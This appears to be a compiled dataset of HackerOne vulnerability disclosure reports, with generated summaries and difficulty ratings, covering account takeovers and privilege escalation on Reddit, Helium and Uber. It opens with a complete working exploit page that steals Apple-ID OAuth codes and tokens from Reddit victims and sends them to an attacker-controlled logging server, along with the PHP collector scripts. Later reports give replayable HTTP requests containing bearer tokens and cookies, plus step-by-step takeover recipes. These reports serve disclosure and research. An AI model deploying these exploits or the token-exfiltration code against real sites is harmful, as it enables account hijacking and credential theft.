2<style>pre { word-break: break-word; white-space: pre-wrap; }</style>
3<body>
4<div id="start">
5Attacker, enter your Apple ID-OAuth URL when trying to <a href="https://reddit.com" target="_blank">sign in to Reddit here</a>:<br />
6<input id="state">
7<button onclick="launch(extractstate(document.getElementById('state').value), true)">Generate a victim URL with attacker's state</button>
8</div>
9
10
11<div id="fr"></div>
12
13<script>
14var inj, monitor;
15function extractstate(st) {
16    return st.indexOf('&state=') !== -1 ? st.split('&state=')[1].split('&')[0] : st;
17}
18function startmonitor(st) {
19    history.pushState('/','/',location.pathname + '?monitor&state=' + st)
20    monitor = setInterval(function() {
21        fetch('https://MY-LOGGER-DOMAIN/reddit/parse.php?q=' + st).then(e => e.text()).then(e => {
22            if (e.length) {
23                document.getElementById('fr').innerText = 'Attacker, log in to Reddit by running this in the console from Apple-ID popup: ';
24                var p = document.createElement('pre');
25                p.innerText = 'opener.postMessage(\'' + unescape(e.trim()) + '\',"*");';
26                document.getElementById('fr').appendChild(p)
27                clearInterval(monitor);
28            }
29        });
30    }, 2000);
31}
32function launch(st, showonly) {
33    if (showonly) {
34        history.pushState('/','/',location.pathname + '?state=' + st)
35        document.getElementById('fr').innerText = 'Send this link to victim: ';
36        var p = document.createElement('pre');
37        p.innerText = location.href;
38        document.getElementById('fr').appendChild(p);
39        startmonitor(st);
40    } else {
41        document.getElementById('fr').innerHTML = '<iframe src="https://www.redditmedia.com/gtm/jail?id=GTM-N3HH8D6&state=' + encodeURIComponent(st) + '" frameborder=0 style="width: 500px; height: 300px"></iframe>';
42    }
43    document.getElementById('start').innerHTML = '';
44}
45if (location.search && location.search.split('state=')[1].split('&')[0]) {
46    launch(location.search.split('state=')[1].split('&')[0], location.search.indexOf('monitor') !== -1);
47}
48window.onmessage = function(e) {
49    if (e.data === 'stopinject') {
50        console.log('frame injected');
51        clearInterval(inj)
52    }
53    if (e.data.indexOf('id_token') !== -1 || e.data.indexOf('code') !== -1) {
54        payload = JSON.parse(e.data);
55        data = payload.hash.replace('state=state=', 'state=');
56        var state = data.split('state=')[1].split('&')[0];
57        var code = data.split('code=')[1].split('&')[0];
58        var id_token = data.split('id_token=')[1].split('&')[0];
59        var payload = JSON.stringify({method:'oauthDone',data:{authorization:{code:code,id_token:id_token,state:state}}});
60
61        document.getElementById('fr').innerHTML = 'Attacker now have the code from Apple:<br />';
62        var p = document.createElement('pre');
63        p.innerText = payload;
64        document.getElementById('fr').appendChild(p);
65
66        var s = document.createElement('img');
67        s.src = 'https://MY-LOGGER-DOMAIN/reddit/log.php?' + payload;
68        document.body.appendChild(s);   
69    }
70}
71
72</script>
73
74
75</body>
76</html>
What this page will do is:
Ask the attacker to prepare the state-param from its own browser. This is to taint the victim's code with the state so that the attacker can then sign in. This will also start to monitor the log asking for any code from the state provided.
<image_0>
<image_1>
Load the https://www.redditmedia.com with my own custom GTM into an iframe. It is not restricted to be framed in any way, anyone can load it.
The GTM-script will load, it looks like this:
Code 1.06 KiB
1<script>var b, x;
2var state = parent.location.href.substr(location.href.indexOf('state='));
3var d = document.createElement('div');
4if (!window.inited) {
5  window.inited = true;
6d.innerHTML = '<a href="#" onclick="b=window.open(\'https://appleid.apple.com/auth/authorize?client_id=com.reddit.RedditAppleSSO&redirect_uri=https%3A%2F%2Fwww.reddit.com&response_type=code+id_token&state=' + state + '&scope=&response_mode=fragment&m=12&v=1.5.4\');">Click here to hijack Apple access-token for Reddit</a>';
7parent.document.children[parent.document.children.length - 1].appendChild(d);
8if(top!==parent.window) top.postMessage('stopinject', '*');
9parent.window.onmessage=function(e) { if(e.data.indexOf('id_token') !== -1 || e.data.indexOf('code') !== -1) { top.postMessage(e.data, '*'); b.close(); } };
10x = setInterval(function() {
11if(parent.window.b && parent.window.b.frames[0] && parent.window.b.frames[0].window && parent.window.b.frames[0].window.name) {
12  top.postMessage(parent.window.b.frames[0].window.name, '*'); parent.window.b.close();
13  clearInterval(x);
14};
15
16}, 500);
17}
18</script>
This javascript will render the "Click here"-link:
<image_2>
It will ask the parent window to stop injecting by postMessage, and it will run an interval looking for the frames[1].window.name, which is the regular www.redditmedia.com iframe of the window that was opened, as soon as it contains code, the value will be sent to the attacker main window through this frame.
5. The attacker's main window will listen for a postMessage containing code and will show the state+code in the window. The page will then load an external logging-URL with the payload.
<image_3>
The attacker now gets the token from the victim in his browser thanks to the monitoring of the log on my server:
<image_4>
Logging endpoints
I've added some endpoints in the HTML to log and parse the log to extract the code-parameter. You need to use your own endpoints if you don't want to try mine above from my link.
https://USE-YOUR-OWN-LOGGER/reddit/log.php looks like this:
Code 120 Bytes
1<?php
2
3if (isset($_SERVER['QUERY_STRING'])) {
4	file_put_contents('r.log', $_SERVER['QUERY_STRING']."\n", FILE_APPEND);
5}
And https://USE-YOUR-OWN-LOGGER/reddit/parse.php looks like this:
Code 313 Bytes
1<?php
2header("Access-Control-Allow-Origin: *");
3header("Content-type: text/plain");
4
5$key = @$_GET['q'];
6if (!$key || !preg_match('#^[a-f0-9]{48}$#', $key)) { die; }
7$data = explode("\n", file_get_contents('r.log'));
8foreach($data as $line) {
9	if (strpos($line, $key) !== false) {
10		echo $line . "\n";
11		die;
12	}
13}
Mitigation
Remove fragment part when location is sent to www.redditmedia.com or any other party.
Restrict your redirect_uri of Apple-ID to something that does not load a domain that could run arbitrary javascript.
Impact
Attacker can sign in as the victim. There's minimal interaction needed, only one click.
This took quite some time to get built :) I hope you'll like it!
Regards,
Frans



================================================================================
Vulnerability Description:
This vulnerability allows an attacker to hijack a victim's Reddit account when using Apple sign-in by manipulating the OAuth flow to leak tokens via URL fragment and capturing them through an XSS in a www.redditmedia.com iframe.

Steps to Reproduce:
1. Attacker prepares a state-parameter from their own Apple sign-in flow with Reddit.
2. Attacker creates a malicious page with their state parameter and loads an iframe from www.redditmedia.com.
3. Victim clicks a link on the attacker's page, initiating Apple sign-in with the attacker's state parameter.
4. After sign-in, tokens appear in the URL fragment of reddit.com, which the attacker's iframe captures via XSS.
5. Attacker uses the stolen tokens to hijack the victim's Reddit account.
Exploitation Difficulty:
The attack involves multiple components (OAuth flow manipulation, XSS, iframe communication) and requires understanding subtle interactions between them, such as response_type switching and fragment token leakage. The attacker must also maintain context across these components while crafting the exploit.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1596663: Admin can create a hidden admin account  which even the owner can not detect and remove and do administrative actions on the application.
================================================================================
RAW DESCRIPTION:

ads.reddit.com is an ads creating and managing application for reddit. The application has the feature to invite other members to the organization and give different roles at ad management.
Testing around the role management functionalities, I have noticed that a user with the same email can get invited to the same organization multiple times if the user is assigned with different roles.
So, taking advantage of this behavior I found the admin as an attacker can create an undetectable/hidden admin account and do administrative actions on the organization like remove other users and invite other users. Since this malicious account information can not be seen in the members section, even the owner of the organization can not detect and remove this malicious user from the organization.
Steps to reproduce:
1) Login as admin from https://ads.reddit.com/
Code 249 Bytes
1I know creating an owner account and then creating an admin account with in a limited time is  little-bit painful.
2You can use the following credentials to login as admin
3
4        email :██████████
5        name: ███████
6        password : ██████████
2) Go to https://ads.reddit.com/account/███/permissions and invite a user (malicious hidden user) by giving the role as admin
3) login to that account (malicious hidden user) from a different browser and accept the invite.
4) Same as the second step, go to the admin account and invite the same malicious user by giving the role as Analyst.
5) Now go to the malicious user account and then go to https://ads.reddit.com/accounts.
6) You will see the new invitation arrived with the Analyst role. Accept the invitation.
7) From this account (malicious) go to https://ads.reddit.com/account/████████/billing while intercepting the requests using burpsuite.
8) Look at the burp history and find out the Authorization token used by the account and copy it. (see copy-the-auth-token.png)
9) Now go to the normal admin account and change the permission of this malicious account to None (It removes malicious account from the organization) and refresh the page to confirm that the malicious user is removed.
10) Using burpsuite repeater, change the email and send the following request by replacing the token which you copied from the 8'th step.
Code 660 Bytes
1POST /api/v2.0/accounts/█████████/invitations HTTP/2
2Host: ads-api.reddit.com
3Content-Length: 87
4Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="102"
5Accept: application/json
6Content-Type: application/json
7Authorization: ██████
8Sec-Ch-Ua-Mobile: ?0
9User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36
10Sec-Ch-Ua-Platform: "Linux"
11Origin: https://ads.reddit.com
12Sec-Fetch-Site: same-site
13Sec-Fetch-Mode: cors
14Sec-Fetch-Dest: empty
15Referer: https://ads.reddit.com/
16Accept-Encoding: gzip, deflate
17Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
18
19{"data":{"recipient_email":"█████████","type":"ADMIN"}}
20
11) Now you are able to invite other users to the organization even though you are not a member of that organization.
Impact
Let me explain the impact with different scenarios as an example.
1)
The owner invites an admin to the organization and the admin who knows about this issue creates an account in this way.
Latter, the owner decide to change the role of this admin to analyst or remove this admin from the organization due to some reasons
Now the admin as the malicious user, can do sensitive actions in the organization like inviting or removing other users.
When the owner goes to the members section, he will not find the malicious account there and even he can not remove that malicious account from the organization.
2)
It also happens when the owner or admin invites other users accidentally in this way.
It is not complicated, the vulnerability arises when a user accepts multiple invitations assigned with different roles from a single organization.



================================================================================
Vulnerability Description:
An admin can create a hidden admin account by exploiting the ability to invite the same user with different roles. This hidden account remains undetectable and can perform administrative actions even after being 'removed' from the organization.

Steps to Reproduce:
1. Login as admin from https://ads.reddit.com/
2. Go to permissions page and invite a user with admin role
3. Login to the invited account and accept the invite
4. From the admin account, invite the same user again but with Analyst role
5. From the malicious user account, accept the new invitation
6. Use Burp Suite to capture the Authorization token from the malicious account
7. From the admin account, change the malicious user's role to None to remove them
8. Use the captured token to send a request to invite another user as an admin
9. Verify the malicious account can perform admin actions despite being 'removed'
Exploitation Difficulty:
The vulnerability involves multiple steps including role manipulation, session token capture, and exploiting invitation logic. The interaction between these components is subtle and requires understanding of the application's state management.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/809816: Organization Takeover
================================================================================
RAW DESCRIPTION:

Hello @helium,
The console.helium.com application doesn't correctly manage the /membership/ resources and allows a user to privilege escalate an organization of which he's part of just modifying it's role.
Steps to reproduce the bug
1) Let's make two user accounts:
azraelsec@wearehackerone.com [A]
███ [B] (this is actually my personal account and can be deleted)
Initial Context: azraelsec is Administrator of the hackerone organization while federicogerardi94 is Administrator of the testhackerone organization.
Goal: azraelsec becomes Administrator of testhackerone.
2) [B] invites [A] to take part in his testhackerone organization with the role of Manager
3) [A] switches to testhackerone organization and makes a graphql query to leak his Manager membership's id (using graphql it's only possible to see the memberships of the current organization):
Code 2.14 KiB
1POST /graphql HTTP/1.1
2Host: console.helium.com
3Connection: close
4Content-Length: 488
5accept: */*
6Sec-Fetch-Dest: empty
7authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTgzMzQxMTQ0LCJpYXQiOjE1ODMyNTQ3NDQsImlzcyI6ImNvbnNvbGUiLCJqdGkiOiIzNzQ4ZmJkYS1iMjhiLTRlOWYtOThiMy00ZTUzMGRlYWEwNmMiLCJuYmYiOjE1ODMyNTQ3NDMsIm9yZ2FuaXphdGlvbiI6IjkxNmE3NmJmLWM3ZmEtNDkxYi1hZjAyLTY3NGY5YWYwZTFhMyIsIm9yZ2FuaXphdGlvbl9uYW1lIjoidGVzdGhhY2tlcm9uZSIsInN1YiI6IjU1OTQ2ZDBlLTBhOTAtNGQ0ZC05ZGI4LTEyMjM2MmY1Nzc1NiIsInR5cCI6ImFjY2VzcyJ9.-1VwG72225yPkZ0BimNSw_DFURRlT8Wh-AcAuDXgJFEEfiPduEdWcwwxY6-oQEHx8ILFUlxQYdbduYiTA-D79Q
8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
9content-type: application/json
10Origin: https://console.helium.com
11Sec-Fetch-Site: same-origin
12Sec-Fetch-Mode: cors
13Referer: https://console.helium.com/users
14Accept-Encoding: gzip, deflate
15Accept-Language: it-IT,it;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6
16Cookie: _ga=GA1.2.356414044.1583245182; _gid=GA1.2.514054915.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22; ajs_group_id=null; ajs_user_id=1; intercom-id-ghj6l8hv=253a4abc-6b70-4491-9b80-b8b69c070546; intercom-session-ghj6l8hv=; _console_key=SFMyNTY.g3QAAAAA.vg9m7JVv2pR0cST_2fykHvzkeAyEyq8PdhkZ0fBMMiM; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6IjI4OGY3ZTJiLTRjNTgtNDEyOC1hNWUwLTliYjY0OTRkMzU2N1IiLCJ1c2VySWQiOiI1NTk0NmQwZS0wYTkwLTRkNGQtOWRiOC0xMjIzNjJmNTc3NTYiLCJvcHRPdXQiOmZhbHNlLCJzZXNzaW9uSWQiOjE1ODMyNDYzMzc1MzksImxhc3RFdmVudFRpbWUiOjE1ODMyNTQ3NDg0OTgsImV2ZW50SWQiOjE5MywiaWRlbnRpZnlJZCI6NDEsInNlcXVlbmNlTnVtYmVyIjoyMzR9
17
18{"operationName":"PaginatedMembershipsQuery","variables":{"page":1,"pageSize":10},"query":"query PaginatedMembershipsQuery($page: Int, $pageSize: Int) {\n  memberships(page: $page, pageSize: $pageSize) {\n    entries {\n      ...MembershipFragment\n      __typename\n    }\n    totalEntries\n    totalPages\n    pageSize\n    pageNumber\n    __typename\n  }\n}\n\nfragment MembershipFragment on Membership {\n  id\n  email\n  role\n  inserted_at\n  two_factor_enabled\n  __typename\n}\n"}
Code 757 Bytes
1HTTP/1.1 200 OK
2Connection: close
3Cache-Control: max-age=0, private, must-revalidate
4Content-Length: 514
5Content-Type: application/json; charset=utf-8
6Date: Tue, 03 Mar 2020 16:59:27 GMT
7Server: Cowboy
8Strict-Transport-Security: max-age=31536000
9Via: 1.1 vegur
10
11{"data":{"memberships":{"__typename":"PaginatedMemberships","entries":[{"__typename":"Membership","email":"████████","id":"512c8188-7008-49ce-a140-3538696e8c2c","inserted_at":"2020-03-03T16:09:37","role":"admin","two_factor_enabled":false},{"__typename":"Membership","email":"azraelsec@wearehackerone.com","id":"bc96332e-c6b4-4728-b35e-8145eea0996a","inserted_at":"2020-03-03T16:42:49","role":"manager","two_factor_enabled":false}],"pageNumber":1,"pageSize":10,"totalEntries":2,"totalPages":1}}}
NOTE: [A] is a member of testhackerone with the role of Manager using the membership id bc96332e-c6b4-4728-b35e-8145eea0996a
3) [A] switches back to his hackerone organization (this will provide him a new full-privileged token) and sends a PUT request on the /membership/ resource pointing out the membership's id leaked before, changing his role to admin:
Code 1.73 KiB
1PUT /api/memberships/bc96332e-c6b4-4728-b35e-8145eea0996a HTTP/1.1
2Host: console.helium.com
3Connection: close
4Content-Length: 31
5accept: */*
6Sec-Fetch-Dest: empty
7authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTgzMzQxNTA0LCJpYXQiOjE1ODMyNTUxMDQsImlzcyI6ImNvbnNvbGUiLCJqdGkiOiJkODIxNzAwYS0xMGE5LTQwOGItYjc3ZC01OGY5ODY2ZWFkZmUiLCJuYmYiOjE1ODMyNTUxMDMsIm9yZ2FuaXphdGlvbiI6IjZjNmM4YzhhLTQ5ZmUtNGJlZi1hMDBjLWZkOTliZWUzOWIwZCIsIm9yZ2FuaXphdGlvbl9uYW1lIjoiaGFja2Vyb25lIiwic3ViIjoiNTU5NDZkMGUtMGE5MC00ZDRkLTlkYjgtMTIyMzYyZjU3NzU2IiwidHlwIjoiYWNjZXNzIn0.r13Aj4TXYzLYJ7clq9gl_SbpdSnVZpUsj0rFtgIMMeUXAE-44iiReL8bffEy4414L6Ess-dOH5L7MFiT55GAqw
8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
9content-type: application/json
10Origin: https://console.helium.com
11Sec-Fetch-Site: same-origin
12Sec-Fetch-Mode: cors
13Referer: https://console.helium.com/users
14Accept-Encoding: gzip, deflate
15Accept-Language: it-IT,it;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6
16Cookie: _ga=GA1.2.356414044.1583245182; _gid=GA1.2.514054915.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22; ajs_group_id=null; ajs_user_id=1; intercom-id-ghj6l8hv=253a4abc-6b70-4491-9b80-b8b69c070546; intercom-session-ghj6l8hv=; _console_key=SFMyNTY.g3QAAAAA.vg9m7JVv2pR0cST_2fykHvzkeAyEyq8PdhkZ0fBMMiM; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6IjI4OGY3ZTJiLTRjNTgtNDEyOC1hNWUwLTliYjY0OTRkMzU2N1IiLCJ1c2VySWQiOiI1NTk0NmQwZS0wYTkwLTRkNGQtOWRiOC0xMjIzNjJmNTc3NTYiLCJvcHRPdXQiOmZhbHNlLCJzZXNzaW9uSWQiOjE1ODMyNDYzMzc1MzksImxhc3RFdmVudFRpbWUiOjE1ODMyNTEwNzEwNDEsImV2ZW50SWQiOjEzOSwiaWRlbnRpZnlJZCI6MjksInNlcXVlbmNlTnVtYmVyIjoxNjh9
17
18{"membership":{"role":"admin"}}
Since the back-end only checks if the requesting account has is an admin in its actual organization' scope but not if the membership that he's modifying is related to this, the request works, allowing [A] to becoming Administrator of hackeronetest organization:
Code 456 Bytes
1HTTP/1.1 200 OK
2Connection: close
3Cache-Control: max-age=0, private, must-revalidate
4Content-Length: 154
5Content-Type: application/json; charset=utf-8
6Date: Tue, 03 Mar 2020 17:10:01 GMT
7Message: User role updated successfully
8Server: Cowboy
9Strict-Transport-Security: max-age=31536000
10Via: 1.1 vegur
11
12{"email":"azraelsec@wearehackerone.com","id":"bc96332e-c6b4-4728-b35e-8145eea0996a","joined_at":"2020-03-03T16:42:49","role":"admin","type":"memberships"}
NOTE: [A] has to be sure not to switch to testhackerone!! To exploit the vulnerability [A] needs to remain inside the organization of which he is Administrator (a POST call to /api/organizations/6c6c8c8a-49fe-4bef-a00c-fd99bee39b0d/switch will invalidate the Bearer token and provide a new one that has the correct privileges).
4) Now [A] can switch again organization to hackeronetest and administrate it as Administrator:
Code 2.14 KiB
1POST /graphql HTTP/1.1
2Host: console.helium.com
3Connection: close
4Content-Length: 488
5accept: */*
6Sec-Fetch-Dest: empty
7authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTgzMzQyMDk5LCJpYXQiOjE1ODMyNTU2OTksImlzcyI6ImNvbnNvbGUiLCJqdGkiOiI0YWM5ZDk2OC1hMGYwLTQ5MDgtODZmMi0wNTE3ZjE3OTE0NjMiLCJuYmYiOjE1ODMyNTU2OTgsIm9yZ2FuaXphdGlvbiI6IjkxNmE3NmJmLWM3ZmEtNDkxYi1hZjAyLTY3NGY5YWYwZTFhMyIsIm9yZ2FuaXphdGlvbl9uYW1lIjoidGVzdGhhY2tlcm9uZSIsInN1YiI6IjU1OTQ2ZDBlLTBhOTAtNGQ0ZC05ZGI4LTEyMjM2MmY1Nzc1NiIsInR5cCI6ImFjY2VzcyJ9.rShCG6pW0Pjkd_dd8KTslyKPU38jrzhMrn39dkxdIqhePsCFx4FsEmNSKXTNm2zD02dPZNkp_N_FGtcen8kaeQ
8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
9content-type: application/json
10Origin: https://console.helium.com
11Sec-Fetch-Site: same-origin
12Sec-Fetch-Mode: cors
13Referer: https://console.helium.com/users
14Accept-Encoding: gzip, deflate
15Accept-Language: it-IT,it;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6
16Cookie: _ga=GA1.2.356414044.1583245182; _gid=GA1.2.514054915.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22; ajs_group_id=null; ajs_user_id=1; intercom-id-ghj6l8hv=253a4abc-6b70-4491-9b80-b8b69c070546; intercom-session-ghj6l8hv=; _console_key=SFMyNTY.g3QAAAAA.vg9m7JVv2pR0cST_2fykHvzkeAyEyq8PdhkZ0fBMMiM; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6IjI4OGY3ZTJiLTRjNTgtNDEyOC1hNWUwLTliYjY0OTRkMzU2N1IiLCJ1c2VySWQiOiI1NTk0NmQwZS0wYTkwLTRkNGQtOWRiOC0xMjIzNjJmNTc3NTYiLCJvcHRPdXQiOmZhbHNlLCJzZXNzaW9uSWQiOjE1ODMyNDYzMzc1MzksImxhc3RFdmVudFRpbWUiOjE1ODMyNTU3MDI0MTAsImV2ZW50SWQiOjIwMywiaWRlbnRpZnlJZCI6NDMsInNlcXVlbmNlTnVtYmVyIjoyNDZ9
17
18{"operationName":"PaginatedMembershipsQuery","variables":{"page":1,"pageSize":10},"query":"query PaginatedMembershipsQuery($page: Int, $pageSize: Int) {\n  memberships(page: $page, pageSize: $pageSize) {\n    entries {\n      ...MembershipFragment\n      __typename\n    }\n    totalEntries\n    totalPages\n    pageSize\n    pageNumber\n    __typename\n  }\n}\n\nfragment MembershipFragment on Membership {\n  id\n  email\n  role\n  inserted_at\n  two_factor_enabled\n  __typename\n}\n"}
Code 756 Bytes
1HTTP/1.1 200 OK
2Connection: close
3Cache-Control: max-age=0, private, must-revalidate
4Content-Length: 512
5Content-Type: application/json; charset=utf-8
6Date: Tue, 03 Mar 2020 17:17:12 GMT
7Server: Cowboy
8Strict-Transport-Security: max-age=31536000
9Via: 1.1 vegur
10
11{"data":{"memberships":{"__typename":"PaginatedMemberships","entries":[{"__typename":"Membership","email":"█████████","id":"512c8188-7008-49ce-a140-3538696e8c2c","inserted_at":"2020-03-03T16:09:37","role":"admin","two_factor_enabled":false},{"__typename":"Membership","email":"azraelsec@wearehackerone.com","id":"bc96332e-c6b4-4728-b35e-8145eea0996a","inserted_at":"2020-03-03T16:42:49","role":"admin","two_factor_enabled":false}],"pageNumber":1,"pageSize":10,"totalEntries":2,"totalPages":1}}}
Impact
This vulnerability lets a user with low privileges to escalate and to become Administrator of an Organization of which was a simple Manager, deleting the original Administrator and to full control it



================================================================================
Vulnerability Description:
The vulnerability allows a user to escalate their privileges from Manager to Administrator in an organization they are part of by exploiting improper role management in the /membership/ resource. The backend only checks if the requesting user is an Admin in their current organization but does not verify if the membership being modified belongs to that organization.

Steps to Reproduce:
1. Create two user accounts: one as an Administrator of an organization (User A) and another as an Administrator of a different organization (User B).
2. User B invites User A to their organization with a Manager role.
3. User A switches to User B's organization and uses GraphQL to leak their Manager membership ID.
4. User A switches back to their original organization and sends a PUT request to modify their role in User B's organization to Admin using the leaked membership ID.
5. User A switches to User B's organization and confirms they now have Admin privileges.
Exploitation Difficulty:
The attack involves multiple steps, including switching between organizations, leaking membership IDs via GraphQL, and manipulating role permissions. The interaction between these steps is subtle and requires understanding the application's state management and token handling. The logic flaw in role verification is non-obvious and not commonly found in other applications.

--------------------------------------------------------------------------------



Improper Authentication - Generic Vulnerabilities (5 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1627961: Account takeover on ███████ [HtUS]
================================================================================
RAW DESCRIPTION:

Hello,
I have found an endpoint in ████████ is vulnerable to Account takeover
Steps to reproduce:
Create 2 accounts ( Attacker ( A ) and vicitm ( B ) )
Log in to all of them and go to https://███████/███████/EditUserProfile with attacker's account
Now fill out the password with your password
Change the attacker's attacker@gmail.com email with victim's email victim@gmail.com
Click Submit button and forward the request to repeater
Now if the vicim tried to log into his account, he will facing an error
Back to the request go to repeater and change the User id of the attacker with the vicim's user ID ( You probley need to brute-force it )
Forward the request and you will see 302 code response
Stay in the request and change back all changes ( EMAIL and USER ID of Attacker ) and send the request again
Now try to log into the victim's victim@gmail.com account with your password
You will be logged in
POC:
████
Impact
An attacker can takeover accounts



================================================================================
Vulnerability Description:
The vulnerability allows an attacker to take over a victim's account by manipulating the email and User ID fields in a profile edit request. The attacker changes their email to the victim's, locks the victim out, then modifies the User ID to the victim's, and reverts the email. This results in the attacker's password being associated with the victim's account.

Steps to Reproduce:
1. Create two accounts: Attacker (A) and Victim (B). Log in to both accounts.
2. Navigate to the profile edit page (https://███████/███████/EditUserProfile) using the attacker's account.
3. Change the attacker's email to the victim's email (victim@gmail.com) and fill in the password field with the attacker's password.
4. Submit the changes and capture the request in a repeater tool (e.g., Burp Repeater).
5. Observe that the victim can no longer log in to their account due to the email change.
6. In the repeater, modify the request by changing the User ID from the attacker's to the victim's (may require brute-forcing the victim's User ID).
7. Send the modified request and observe a 302 response code.
8. Revert the email and User ID changes in the request and send it again.
9. Log in to the victim's account (victim@gmail.com) using the attacker's password. The attacker now has access to the victim's account.
Exploitation Difficulty:
The attack involves multiple steps, including manipulating email and User ID fields, understanding the application's response codes (302), and reverting changes to achieve the desired state. The interaction between these steps is non-obvious, and the attack requires maintaining context across several requests.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/219205: Authentication bypass on auth.uber.com via subdomain takeover of saostatic.uber.com
================================================================================
RAW DESCRIPTION:

Summary
This is not a standard vulnerability, but a chain of two more exotic vulnerabilities leading to a full authentication bypass of your SSO login system at auth.uber.com (via saostatic.uber.com). The root cause of this authentication bypass is two-fold:
Subdomain saostatic.uber.com was pointing to Amazon Cloudfront CDN, but the hostname was not registered there anymore. This allowed me to fully takeover this domain. It is now serving content of my own webserver, both over http and https (highly similar to 175070 - however, I must disagree with "there are some mitigating factors (cookie scope) that make this not as bad as it might appear at first blush.").
Your SSO system at auth.uber.com issues session cookies which are temporarily shared between all https://*.uber.com subdomains through its "domain=.uber.com" attribute. Although there were some countermeasures to prevent theft, the current setup still allows leakage of these high-value session cookies to the overtaken subdomain https://saostatic.uber.com in all modern browsers, leading to a full Authentication Bypass (highly similar to 172137).
Security Impact
The security impact of the subdomain takeover is that Uber can be impersonated via this webpage. A valid SSL certificate could easily be generated for this domain via Let's Encrypt, which would make it ideal for e.g. phishing attacks.
The security impact of the SSO system using shared session cookies for https://.uber.com is, in combination with the subdomain takeover vulnerability, an Authentication Bypass via session hijacking. A victim must be authenticated to auth.uber.com and then visit a webpage under the attacker's control to be exploited successfully - no further interaction is required from the victim, the attack can be performed stealthily without the user noticing or being notified by Uber. The end result is that the attacker can now impersonate the victim on any of the .uber.com which rely on auth.uber.com for authentication, such as riders.uber.com, partners.uber.com, developer.uber.com, bonjour.uber.com, etc.
# 1. Subdomain Takeover
The subdomain "saostatic.uber.com" was (and still is) a CNAME pointing to a AWS Cloudfront CDN server (depending on your location, the latter will resolve differently):
Code 168 Bytes
1# nslookup saostatic.uber.com 8.8.8.8
2Server:		8.8.8.8
3Address:	8.8.8.8#53
4
5Non-authoritative answer:
6saostatic.uber.com	canonical name = d3i4yxtzktqr9n.cloudfront.net.
However, the hostname "saostatic.uber.com" was not claimed anymore on Cloudfront, resulting in a Cloudfront error page when visiting the subdomain before the takeover:
<image_0>
Subsequently, a new Amazon Cloudfront CDN endpoint was created and linked to an attacker-controlled origin server. For the new Cloudfront CDN endpoint, "saostatic.uber.com" was designated as hostname successfully:
<image_1>
This concluded the subdomain takeover. Visual proof can be found at http://saostatic.uber.com/subdomaintakeoverbyarneswinnen.html (unguessable filename chosen to not negatively affect Uber's reputation during takeover period) :
<image_2>
#2. Authentication Bypass
In Uber's SSO system, auth.uber.com acts as Identity Provider and issues temporarily shared session cookies for https://*.uber.com to communicate identities to Service Providers (e.g. riders.uber.com, partners.uber.com, etc). Service Providers on their end immediately destroy the incoming temporary shared session cookies in case of erroneous (e.g. issued for other Service Provider) or successful authentication, ensuring the window for theft is small:
{F202679}
The precious shared session cookie "_csid" can thus only be stolen between step 9 and 10, which is a very short period (automatic browser redirect). Although not impossible to exploit, a more convenient flaw was identified that allows the shared session cookie to remain alive after step 9 in the browser's cookie store in the diagram above. The issue is that, if the victim is already logged in at https://riders.uber.com (situation after last step 12 in diagram) when receiving a request containing a valid newly generated shared session cookie "_csid", it is simply ignored. Hence it stays alive in the browser until its cookie store is cleared. An attacker simply needs to directly issue another login scenario starting from step 3 in the above diagram, and end with an additional hidden request to https://saostatic.uber.com to steal the precious session cookie:
{F202676}
So now an attacker has his/her hands on the victim's "_csid" shared session cookie for https://riders.uber.com, he/she can execute the normal login flow in their own browser and replace the issued "_csid" cookie value in step 9 of the first Uber SSO Login diagram to be logged in as the victim, right? Wrong. There's another countermeasure in place, namely a variant of login cross-site request forgery protection. This is the actual updated Uber SSO Login 2 diagram:
{F202678}
The problem here are the GET param state=CSRFTOKEN and locally scoped state cookie that are added in step 3 by the Service Provider riders.uber.com and verified in step 11. Since we can't steal these values from the victim's browser, but only the "_csid" shared session cookie, this means game over, right?
No! An attacker can obtain a proper CSRFTOKEN value and accompanying state cookie value from https://riders.uber.com by starting a normal login scenario on their end (e.g. in their own browser or via a simple script). He/she can then relay the auth.uber.com URL to the victim's browser to get the "_csid" shared session cookie for these values, and inject these in his/her own browser login scenario again in step 9. In this manner, the victim effectively generates the "_csid" temporary session token for the attacker's login scenario in a separate browser, but this works flawlessly. This still allows exploitation and thus victim impersonation in the following manner (we still assume that the victim is already logged in to auth.uber.com and visits a webpage under control by the attacker, so we basically continue the flow from the above third and last diagram):
{F202677}
PoC
In the PoC below, the assumption is made that https://saostatic.uber.com is actually serving a valid certificate in the victim's browser, which currently is not the case (so there is currently no actual exposed risk). I figured you might not appreciate that.
